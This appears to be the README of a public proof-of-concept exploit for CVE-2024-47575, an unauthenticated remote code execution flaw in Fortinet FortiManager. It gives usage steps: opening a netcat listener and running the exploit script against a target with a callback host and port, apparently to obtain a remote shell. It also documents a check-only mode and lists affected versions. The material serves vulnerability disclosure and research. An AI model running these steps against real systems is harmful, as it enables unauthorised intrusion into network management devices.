# CVE-2024-47575
Fortinet FortiManager Unauthenticated Remote Code Execution AKA FortiJump CVE-2024-47575

 See our [blog post](http://labs.watchtowr.com/hop-skip-fortijump-fortijumphigher-cve-2024-23113-cve-2024-47575) for technical details



To begin, establish your ncat session:

```
nc -lvvnp 80
```

Then, execute our detection artefact generator:

```
python3 CVE-2024-47575.py --target 192.168.1.110 --lhost 192.168.1.53 --lport 80 --action exploit
```

To check vulnerability alone, use the following options:
```
python3 CVE-2024-47575.py --target 192.168.1.110 --action check
```

# Affected Versions

```
FortiManager 7.6.0
FortiManager 7.4.0 through 7.4.4
FortiManager 7.2.0 through 7.2.7
FortiManager 7.0.0 through 7.0.12
FortiManager 6.4.0 through 6.4.14
FortiManager 6.2.0 through 6.2.12
FortiManager Cloud 7.4.1 through 7.4.4
FortiManager Cloud 7.2.1 through 7.2.7
FortiManager Cloud 7.0.1 through 7.0.12
FortiManager Cloud 6.4
```

# Exploit authors

This exploit was written by [Sina Kheirkhah (@SinSinology)](https://x.com/SinSinology) of [watchTowr (@watchtowrcyber)](https://twitter.com/watchtowrcyber) 


# Follow [watchTowr](https://watchTowr.com) Labs

For the latest security research follow the [watchTowr](https://watchTowr.com) Labs Team 

- https://labs.watchtowr.com/
- https://x.com/watchtowrcyber

